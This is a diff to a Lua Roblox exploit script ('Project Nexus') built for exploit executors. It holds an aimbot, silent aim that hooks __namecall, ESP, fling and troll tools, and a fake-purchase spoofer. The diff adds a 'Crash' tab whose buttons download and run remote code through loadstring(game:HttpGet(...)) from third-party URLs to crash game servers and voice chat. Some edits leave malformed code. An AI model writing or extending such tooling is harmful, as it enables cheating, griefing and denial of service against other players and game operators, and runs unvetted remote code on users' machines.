@@ -35,7 +35,6 @@ local uis = UserInputService
 local replicated = ReplicatedStorage
 local ms = MarketplaceService
 
--- Ensure task.* utilities exist (some older exploit executors lack task.spawn)
 if not task then
 	task = {
 		spawn = function(f) spawn(f) end,
@@ -52,7 +51,6 @@ local FluentSuccess = pcall(function()
 	Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 end)
 
--- Retry with backup sources
 if not FluentSuccess or not Fluent then
 	for _, url in ipairs({
 		"https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua",
@@ -98,6 +96,7 @@ local ShopTab = Window:AddTab({Title = "Shop", Icon = "shopping-cart"})
 local ScriptsTab = Window:AddTab({Title = "Scripts", Icon = "code"})
 local MiscTab = Window:AddTab({Title = "Misc", Icon = "wrench"})
 local SettingsTab = Window:AddTab({Title = "Settings", Icon = "settings"})
+local CrashTab = Window:AddTab({Title = "Crash", Icon = "bomb"})
 
 -- ==================== Exunys Modules ====================
 local ExunysLoaded = false
@@ -156,7 +155,6 @@ end
 
 -- ==================== State ====================
 
--- Combat - Aimbot (delegated to Exunys Aimbot V3 when loaded)
 local aimbotEnabled = false
 local aimKey = Enum.UserInputType.MouseButton2
 local aimKeyIsKeyCode = false
@@ -165,6 +163,7 @@ local aimFovEnabled = true
 local aimFovRadius = 120
 local aimSmoothness = 0.1
 local aimSmoothingMode = "linear"
+local lockMode = "CFrame"
 local aimPrediction = 0.07
 local aimPart = "Head"
 local aimTeamCheck = true
@@ -175,13 +174,11 @@ local aimHitChance = 100
 local silentAimEnabled = false
 local silentAimTeamCheck = false
 
--- Combat - Trigger Bot (delegated to Exunys Aimbot.Triggerbot when loaded)
 local triggerBotEnabled = false
 local triggerBotKey = Enum.UserInputType.MouseButton2
 local triggerBotKeyIsKeyCode = false
 local triggerBotDelay = 0
 
--- Combat - ESP & Crosshair (delegated to Exunys ESP when loaded)
 espEnabled = false
 espTeamCheck = true
 espMaxDistance = 1000
@@ -190,6 +187,8 @@ local crosshairEnabled = false
 local crosshairSize = 8
 local crosshairColor = Color3.fromRGB(255, 255, 255)
 local crosshairDynamic = true
+local crosshairConn = nil
+local crosshairGui = nil
 
 -- Movement
 local flyEnabled = false
@@ -212,7 +211,6 @@ local antiIdleConn = nil
 local walkSpeed = 16
 local jumpPower = 50
 
--- Movement Tech
 local dashEnabled = false
 local dashSpeed = 100
 local dashTime = 0.3
@@ -241,7 +239,6 @@ local bubbleMsg = "Bubble spam"
 local bubbleConn = nil
 local bubbleEnabled = false
 
--- Troll - Physics
 local headSitConn = nil
 local orbitConn = nil
 local orbitSpeed = 50
@@ -337,11 +334,12 @@ function randomString(len)
 end
 
 function findPartFromRayWithIgnoreList(origin, direction, ignore)
-	local ray = Ray.new(origin, direction)
-	if workspace.FindPartOnRayWithIgnoreList then
-		return workspace:FindPartOnRayWithIgnoreList(ray, ignore or {})
-	elseif workspace.FindPartOnRay then
-		return workspace:FindPartOnRay(ray, (ignore and ignore[1]) or nil)
+	local params = RaycastParams.new()
+	params.FilterDescendantsInstances = ignore or {}
+	params.FilterType = Enum.RaycastFilterType.Blacklist
+	local result = workspace:Raycast(origin, direction, params)
+	if result then
+		return result.Instance
 	end
 	return nil
 end
@@ -396,11 +394,8 @@ function syncAimbotSettings()
 	Aimbot_Settings.OffsetToMoveDirection = aimPrediction > 0
 	Aimbot_Settings.OffsetIncrement = aimPrediction * 100
 
-	if aimSmoothingMode == "exponential" then
-		Aimbot_Settings.LockMode = 2
-	else
-		Aimbot_Settings.LockMode = 1
-	end
+	local modeMap = {CFrame = 1, mousemoveabs = 2, mousemoverel = 3}
+	Aimbot_Settings.LockMode = modeMap[lockMode] or 1
 
 	Aimbot_Settings.Sensitivity = aimSmoothness
 end
@@ -475,8 +470,47 @@ function toggleTriggerBot(state)
 end
 function drawCrosshair()
 	if not ExunysLoaded or not Crosshair then
-		if crosshairGui then crosshairGui:Destroy() crosshairGui = nil end
-		if crosshairConn then crosshairConn:Disconnect() crosshairConn = nil end
+		if crosshairGui then
+			for _, line in ipairs(crosshairGui) do
+				line:Remove()
+			end
+			crosshairGui = nil
+		end
+		if not crosshairEnabled then
+			if crosshairConn then crosshairConn:Disconnect() crosshairConn = nil end
+			return
+		end
+		local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+		local halfSize = crosshairSize / 2
+		crosshairGui = {}
+		local hLine = Drawing.new("Line")
+		hLine.From = center - Vector2.new(halfSize, 0)
+		hLine.To = center + Vector2.new(halfSize, 0)
+		hLine.Color = crosshairColor
+		hLine.Thickness = 1
+		hLine.ZIndex = 10
+		crosshairGui[1] = hLine
+		local vLine = Drawing.new("Line")
+		vLine.From = center - Vector2.new(0, halfSize)
+		vLine.To = center + Vector2.new(0, halfSize)
+		vLine.Color = crosshairColor
+		vLine.Thickness = 1
+		vLine.ZIndex = 10
+		crosshairGui[2] = vLine
+		if crosshairConn then crosshairConn:Disconnect() end
+		crosshairConn = RunService.RenderStepped:Connect(function()
+			local c = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+			local half = crosshairSize / 2
+			if crosshairDynamic then
+				local mousePos = uis:GetMouseLocation()
+				local delta = (mousePos - c) * 0.1
+				c = c + delta
+			end
+			crosshairGui[1].From = c - Vector2.new(half, 0)
+			crosshairGui[1].To = c + Vector2.new(half, 0)
+			crosshairGui[2].From = c - Vector2.new(0, half)
+			crosshairGui[2].To = c + Vector2.new(0, half)
+		end)
 		return
 	end
 	if not crosshairEnabled then
@@ -490,8 +524,7 @@ function drawCrosshair()
 	Crosshair.Color = crosshairColor
 
 	if crosshairDynamic then
-		Crosshair.Position = 1 -- Mouse position
-	else
+		Crosshair.Position = 1 	else
 		Crosshair.Position = 2 -- Center
 	end
 end
@@ -505,15 +538,22 @@ function toggleCrosshair(state)
 	if state then
 		doNotify("Crosshair", "Enabled.", 2)
 	else
-		if crosshairGui then crosshairGui:Destroy() crosshairGui = nil end
+		if crosshairGui then
+			if type(crosshairGui) == "table" then
+				for _, line in ipairs(crosshairGui) do
+					line:Remove()
+				end
+			else
+				crosshairGui:Destroy()
+			end
+			crosshairGui = nil
+		end
 		if crosshairConn then crosshairConn:Disconnect() crosshairConn = nil end
 		doNotify("Crosshair", "Disabled.", 2)
 	end
 end
 
 -- ==================== Combat: Silent Aim ====================
--- Based on Exunys' ROBLOX Weapons Kit Silent Aim
--- Hooks __namecall to redirect FindPartOnRayWithIgnoreList from ClientWeaponsScript
 
 local silentAimGetClosestPlayer = function()
 	local closest, minDist = nil, math.huge
@@ -819,7 +859,6 @@ function loadConfig()
 	doNotify("Config", "Loaded: " .. configName, 3)
 end
 
--- Performance stats
 local perfConn = nil
 function togglePerfStats()
 	perfStatsEnabled = not perfStatsEnabled
@@ -916,11 +955,9 @@ function copyScriptOutput(output)
 end
 
 -- ==================== State Initialization ====================
--- Scripts state
 scriptHistory = {}
 lastScript = ""
 
--- Misc state
 godmodeEnabled = false
 godmodeConn = nil
 cameraFovValue = 70
@@ -936,7 +973,6 @@ highlightSelfEnabled = false
 noCameraSwayEnabled = false
 noBlurEnabled = false
 
--- Gun Mods state
 gunRecoilPercent = 0
 gunNoSpreadEnabled = false
 gunInfAmmoEnabled = false
@@ -947,12 +983,10 @@ gunModConn = nil
 gunLastCFrame = nil
 gunCharConn = nil
 
--- Weapon cache for background scanner
 weaponCache = {}
 weaponCacheScanning = false
 weaponCacheConn = nil
 
--- Forward declarations for scanner control (ensures visibility across all module blocks)
 startWeaponScanner = nil
 stopWeaponScanner = nil
 function startWeaponScanner()
@@ -990,10 +1024,8 @@ function stopWeaponScanner()
 	end
 end
 
--- Config state
 configName = "default"
 
--- Cleanup-safe connection tokens
 aimMouseConn = nil
 espConn = nil
 espPlayerAddedConn = nil
@@ -1286,7 +1318,6 @@ function toggleGunMods()
 	end
 end
 
--- Auto-update check
 function checkForUpdates()
 	local success, result = pcall(function()
 		return game:HttpGet("https://raw.githubusercontent.com/your-repo/roblox_troll.lua/main/version.txt")
@@ -1469,13 +1500,11 @@ function toggleFly()
 		if flyCharacterRemovingConn then flyCharacterRemovingConn:Disconnect() flyCharacterRemovingConn = nil end
 		if flyBg then flyBg:Destroy() flyBg = nil end
 		if flyBv then flyBv:Destroy() flyBv = nil end
-		-- Zero residual velocity to prevent floating after fly disable
-		local root = getRoot()
+				local root = getRoot()
 		if root and root:IsA("BasePart") then
 			root.Velocity = Vector3.new(root.Velocity.X, math.min(root.Velocity.Y, 0), root.Velocity.Z)
 		end
-		-- Sweep for orphaned BodyVelocity/BodyGyro instances from dash/fling
-		if root then
+				if root then
 			for _, obj in ipairs(root:GetChildren()) do
 				if obj:IsA("BodyVelocity") or obj:IsA("BodyGyro") then
 					if obj.Name:find("Fly") or obj.Name:find("Dash") or obj.Name:find("Velocity") then
@@ -1753,6 +1782,17 @@ function toggleAirJump()
 end
 
 player.CharacterAdded:Connect(function(char)
+	local root = char:WaitForChild("HumanoidRootPart", 5)
+	if root and root:IsA("BasePart") then
+		if root.Velocity.Y > 1 then
+			root.Velocity = Vector3.new(root.Velocity.X, math.min(root.Velocity.Y, 0), root.Velocity.Z)
+			root.RotVelocity = Vector3.new(root.RotVelocity.X, math.min(root.RotVelocity.Y, 0), root.RotVelocity.Z)
+		end
+		for _, name in ipairs({"FlingVelocity", "FlingAngularVelocity", "WalkFlingVelocity", "WalkFlingAngular", "FlyBodyVelocity", "FlyBodyGyro", "DashVelocity"}) do
+			local inst = root:FindFirstChild(name)
+			if inst then inst:Destroy() end
+		end
+	end
 	local hum = char:FindFirstChildOfClass("Humanoid")
 	if not hum then
 		hum = char:WaitForChild("Humanoid", 5)
@@ -2004,7 +2044,9 @@ function stopFling()
 		end
 	end
 	local root = getRoot()
-	if root then
+	if root and root:IsA("BasePart") then
+		root.Velocity = Vector3.new(0, math.min(root.Velocity.Y, 0), 0)
+		root.RotVelocity = Vector3.new()
 		local bav = root:FindFirstChild("FlingAngularVelocity")
 		local bv = root:FindFirstChild("FlingVelocity")
 		if bav then bav:Destroy() end
@@ -2065,6 +2107,15 @@ function toggleWalkFling()
 					part.CanCollide = true
 				end
 			end
+		end
+		local root = getRoot()
+		if root and root:IsA("BasePart") then
+			root.Velocity = Vector3.new(0, math.min(root.Velocity.Y, 0), 0)
+			root.RotVelocity = Vector3.new()
+			local bav = root:FindFirstChild("WalkFlingAngular")
+			local bv = root:FindFirstChild("WalkFlingVelocity")
+			if bav then bav:Destroy() end
+			if bv then bv:Destroy() end
 		end
 		doNotify("WalkFling", "Stopped.", 2)
 	end
@@ -2156,12 +2207,8 @@ function toggleVelocityLoop()
 	doNotify("Velocity Loop", "Stopped.", 2)
 end
 
--- This is called as a toggle from UI
 local velocityLoopEnabled = false
-uis.InputBegan:Connect(function() end) -- placeholder, not used
-
--- We'll use a separate function for velocity loop toggle
--- Called from UI callback with state already set
+uis.InputBegan:Connect(function() end) 
 
 function startVelocityLoop()
 	if velocityConn then return end
@@ -2665,7 +2712,6 @@ end
 
 -- ==================== Fake Purchase ====================
 
--- Product type detection and firing table
 local purchaseKinds = {
 	Product = Enum.InfoType.Product,
 	Gamepass = Enum.InfoType.GamePass,
@@ -2787,7 +2833,6 @@ function fakePurchaseFinished(pid)
 	doNotify("Fake Purchase", "Faked PurchaseFinished: " .. pid, 5)
 end
 
--- Purchase scanning helpers (from improved purchase faker)
 local function httpRequest()
 	return (typeof(request) == "function" and request)
 		or (typeof(http_request) == "function" and http_request)
@@ -2889,8 +2934,7 @@ local scannedProducts = {}
 
 function refreshScannedProducts(onItemScanned)
 	scannedProducts = {}
-	-- Clear previous result buttons
-	for _, btn in ipairs(scannableItemButtons) do
+		for _, btn in ipairs(scannableItemButtons) do
 		if btn and btn.Destroy then
 			pcall(function() btn:Destroy() end)
 		end
@@ -2925,7 +2969,6 @@ function refreshScannedProducts(onItemScanned)
 	end
 end
 
--- Supported games list state
 supportedGamesLoading = false
 supportedGamesCache = {}
 supportedGameButtons = {}
@@ -2961,8 +3004,7 @@ function refreshSupportedGames(onGameFound)
 		return
 	end
 
-	-- Resolve universe IDs and player counts in parallel
-	local entries = {}
+		local entries = {}
 	for i, entry in ipairs(list) do
 		local placeId, name
 		if type(entry) == "table" then
@@ -2976,8 +3018,7 @@ function refreshSupportedGames(onGameFound)
 		end
 	end
 
-	-- Parallel fetch universe IDs
-	local pending = #entries
+		local pending = #entries
 	for _, e in ipairs(entries) do
 		task.spawn(function()
 			local okId, id = pcall(function()
@@ -2993,8 +3034,7 @@ function refreshSupportedGames(onGameFound)
 	end
 	while pending > 0 do task.wait() end
 
-	-- Fetch game stats for player counts
-	local universeIds = {}
+		local universeIds = {}
 	for _, e in ipairs(entries) do
 		if e.universeId then
 			table.insert(universeIds, e.universeId)
@@ -3211,13 +3251,17 @@ combatSection1:AddDropdown("Lock Mode", {
 	Values = {"CFrame", "mousemoveabs", "mousemoverel"},
 	Default = "CFrame",
 	Callback = function(value)
+		lockMode = value
 		if Aimbot_Settings then
 			if value == "CFrame" then
 				Aimbot_Settings.LockMode = 1
 			elseif value == "mousemoveabs" then
-				Aimbot_Settings.LockMode = 3
+				Aimbot_Settings.LockMode = 2
 			else
 				Aimbot_Settings.LockMode = 3
+			end
+			if aimbotEnabled then
+				syncAimbotSettings()
 			end
 		end
 	end
@@ -3374,7 +3418,6 @@ visualsSection1:AddToggle("Health Bar", {
 	end
 })
 
--- ESP Developer Settings
 visualsSection2 = VisualsTab:AddSection("ESP Developer Settings")
 
 visualsSection2:AddDropdown("ESP Update Mode", {
@@ -3426,7 +3469,6 @@ visualsSection2:AddToggle("ESP Throttle", {
 	end
 })
 
--- Aimbot Developer Settings (in Combat tab)
 combatSection3 = CombatTab:AddSection("Aimbot Developer")
 
 combatSection3:AddDropdown("Aimbot Update Mode", {
@@ -3570,7 +3612,6 @@ combatSection6:AddColorpicker("Center Dot Color", {
 	end
 })
 
--- Combat: Extended UI
 triggerSection1 = TriggerTab:AddSection("Trigger Bot")
 
 triggerSection1:AddToggle("Trigger Bot", {
@@ -4438,7 +4479,6 @@ animSection3:AddButton({
 shopSection1 = ShopTab:AddSection("Fake Purchase")
 shopSection2 = ShopTab:AddSection("Purchase Scanner")
 
--- State for dynamic scan result buttons
 local scannableItemButtons = {}
 
 shopSection1:AddInput("Product ID", {
@@ -4454,7 +4494,6 @@ shopSection1:AddButton({
 	Callback = function() fakePurchaseAuto(productId) end
 })
 
--- Auto-purchase state
 autoPurchaseEnabled = false
 autoPurchaseConn = nil
 
@@ -4687,13 +4726,11 @@ settingsSection2:AddButton({
 		if flyCharacterRemovingConn then flyCharacterRemovingConn:Disconnect() flyCharacterRemovingConn = nil end
 		if flyBg then flyBg:Destroy() flyBg = nil end
 		if flyBv then flyBv:Destroy() flyBv = nil end
-		-- Sweep orphaned BodyVelocity/BodyGyro from character on unload
 		local root = getRoot()
 		if root then
-			for _, obj in ipairs(root:GetChildren()) do
-				if obj:IsA("BodyVelocity") or obj:IsA("BodyGyro") then
-					obj:Destroy()
-				end
+			for _, name in ipairs({"FlingVelocity", "FlingAngularVelocity", "WalkFlingVelocity", "WalkFlingAngular", "FlyBodyVelocity", "FlyBodyGyro", "DashVelocity", "DashAngularVelocity"}) do
+				local inst = root:FindFirstChild(name)
+				if inst then inst:Destroy() end
 			end
 		end
 		if bhopConn then bhopConn:Disconnect() bhopConn = nil end
@@ -4706,8 +4743,19 @@ settingsSection2:AddButton({
 		if nameSpamConn then nameSpamConn:Disconnect() end
 		if backwardsConn then backwardsConn:Disconnect() end
 		if bubbleConn then bubbleConn:Disconnect() end
-		if flingConn then flingConn:Disconnect() end
-		if walkFlingConn then walkFlingConn:Disconnect() end
+		flingConn = nil
+		stopFling()
+		if walkFlingConn then walkFlingConn:Disconnect() walkFlingConn = nil end
+		walkFlingEnabled = false
+		local root = getRoot()
+		if root and root:IsA("BasePart") then
+			root.Velocity = Vector3.new(0, math.min(root.Velocity.Y, 0), 0)
+			root.RotVelocity = Vector3.new()
+			local bav = root:FindFirstChild("WalkFlingAngular")
+			local bv = root:FindFirstChild("WalkFlingVelocity")
+			if bav then bav:Destroy() end
+			if bv then bv:Destroy() end
+		end
 		if fakeLagConn then fakeLagConn:Disconnect() end
 		if rotLockConn then rotLockConn:Disconnect() end
 		if sitSpamConn then sitSpamConn:Disconnect() end
@@ -4742,7 +4790,16 @@ settingsSection2:AddButton({
 		if timeConn then timeConn:Disconnect() end
 		if perfConn then perfConn:Disconnect() end
 		if crosshairConn then crosshairConn:Disconnect() crosshairConn = nil end
-		if crosshairGui then crosshairGui:Destroy() crosshairGui = nil end
+		if crosshairGui then
+			if type(crosshairGui) == "table" then
+				for _, line in ipairs(crosshairGui) do
+					line:Remove()
+				end
+			else
+				crosshairGui:Destroy()
+			end
+			crosshairGui = nil
+		end
 
 		if perfGui then perfGui:Destroy() perfGui = nil end
 		if perfLabel then perfLabel = nil end
@@ -4874,7 +4931,6 @@ scriptSection2:AddButton({
 	Callback = function() clearScriptHistory() end
 })
 
--- Common Scripts section
 scriptSection3 = ScriptsTab:AddSection("Common Scripts")
 
 scriptSection3:AddButton({
@@ -5144,13 +5200,85 @@ gunSection2:AddToggle("Aim At Head", {
 	Description = "Target player's head for silent aim",
 	Default = true,
 	Callback = function(state)
-		-- Silent aim always targets Head; this toggle is for visual feedback
+			end
+	})
+
+-- ==================== Crash Server ====================
+local crashSection1 = CrashTab:AddSection("Crash (tested)")
+local crashSection2 = CrashTab:AddSection("Crash (unstable - untested)")
+
+crashSection1:AddButton({
+	Title = "Start Crash",
+	Description = "Loadstring.net server crash exploit",
+	Callback = function()
+		local crashCode = [[
+		local success, result = pcall(function()
+			loadstring(game:HttpGet("https://loadstring.net/raw/alBkrToGk7"))()
+		end)
+		if success then
+			doNotify("Crash", "Server crash initiated.", 3)
+		else
+			doNotify("Crash", "Failed: " .. tostring(result), 5)
+		end
+		]]
+		executeScript(crashCode)
 	end
 })
 
--- ==================== Load ====================
+crashSection1:AddButton({
+	Title = "VC Crash",
+	Description = "Voice chat crasher (Rootleak/Stalkie-2.0)",
+	Callback = function()
+		local crashCode = [[
+		local success, result = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Rootleak/Stalkie-2.0/refs/heads/main/vc.lua"))()
+		end)
+		if success then
+			doNotify("VC Crash", "Initiated.", 3)
+		else
+			doNotify("VC Crash", "Failed: " .. tostring(result), 5)
+		end
+		]]
+		executeScript(crashCode)
+	end
+})
+
+crashSection2:AddButton({
+	Title = "Crash V2",
+	Description = "[UNSTABLE] crashh.txt from stellar-dv/stellar - may not work on all games",
+	Callback = function()
+		local crashCode = [[
+		local success, result = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/main/crashh.txt"))()
+		end)
+		if success then
+			doNotify("Crash V2", "Crash initiated.", 3)
+		else
+			doNotify("Crash V2", "Failed: " .. tostring(result), 5)
+		end
+		]]
+		executeScript(crashCode)
+	end
+})
+
+crashSection2:AddButton({
+	Title = "Crash V3",
+	Description = "[UNSTABLE] crashv2.txt from stellar-dv/stellar - untested",
+	Callback = function()
+		local crashCode = [[
+		local success, result = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/main/crashv2.txt"))()
+		end)
+		if success then
+			doNotify("Crash V3", "Crash initiated.", 3)
+		else
+			doNotify("Crash V3", "Failed: " .. tostring(result), 5)
+		end
+		]]
+		executeScript(crashCode)
+	end
+})
 pcall(function() Window:SelectTab(1) end)
--- Fallback: ensure first tab container is visible (in case task.spawn fails)
 delay(0.5, function()
     pcall(function()
         local coreGui = game:FindFirstChild("CoreGui") or player:FindFirstChild("PlayerGui")
@@ -5165,3 +5293,15 @@ delay(0.5, function()
 	end)
 end)
 doNotify("Project Nexus", "Loaded v2.0. Check all tabs for FE-compatible troll features.", 5)
+
+local initSweepRoot = getRoot()
+if initSweepRoot and initSweepRoot:IsA("BasePart") then
+	if initSweepRoot.Velocity.Y > 1 then
+		initSweepRoot.Velocity = Vector3.new(initSweepRoot.Velocity.X, math.min(initSweepRoot.Velocity.Y, 0), initSweepRoot.Velocity.Z)
+		initSweepRoot.RotVelocity = Vector3.new(initSweepRoot.RotVelocity.X, math.min(initSweepRoot.RotVelocity.Y, 0), initSweepRoot.RotVelocity.Z)
+	end
+	for _, name in ipairs({"FlingVelocity", "FlingAngularVelocity", "WalkFlingVelocity", "WalkFlingAngular", "FlyBodyVelocity", "FlyBodyGyro", "DashVelocity", "DashAngularVelocity"}) do
+		local inst = initSweepRoot:FindFirstChild(name)
+		if inst then inst:Destroy() end
+	end
+end
